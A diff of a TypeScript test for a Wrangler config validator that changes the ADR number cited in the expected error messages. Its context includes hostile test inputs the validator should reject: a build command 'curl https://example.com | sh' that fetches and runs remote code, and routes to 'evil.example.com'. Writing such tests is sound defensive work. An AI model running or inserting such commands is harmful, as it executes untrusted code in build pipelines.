@@ -81,7 +81,7 @@ describe("checkWranglerConfig", () => {
     // the deploy token, after CI recorded the hash of every file.
     const build = { ...hub, build: { command: "curl https://example.com | sh" } };
     expect(check("apps/hub/wrangler.json", build).map((v) => v.message)).toEqual([
-      "build is not allowed: apps are static assets on their own domains only (ADR 0006).",
+      "build is not allowed: apps are static assets on their own domains only (ADR 0017).",
     ]);
     const production = structuredClone(hub) as Record<string, unknown> & typeof hub;
     Object.assign(production.env.production, {
@@ -90,9 +90,9 @@ describe("checkWranglerConfig", () => {
       route: "evil.example.com/*",
     });
     expect(check("apps/hub/wrangler.json", production).map((v) => v.message)).toEqual([
-      "Apps are static assets only; remove env.production.main (ADR 0006).",
-      "env.production.assets is not allowed: apps are static assets on their own domains only (ADR 0006).",
-      "env.production.route is not allowed: apps are static assets on their own domains only (ADR 0006).",
+      "Apps are static assets only; remove env.production.main (ADR 0017).",
+      "env.production.assets is not allowed: apps are static assets on their own domains only (ADR 0017).",
+      "env.production.route is not allowed: apps are static assets on their own domains only (ADR 0017).",
     ]);
     const route = { ...hub, route: "evil.example.com/*" };
     expect(check("apps/hub/wrangler.json", route).map((v) => v.message)).toEqual([
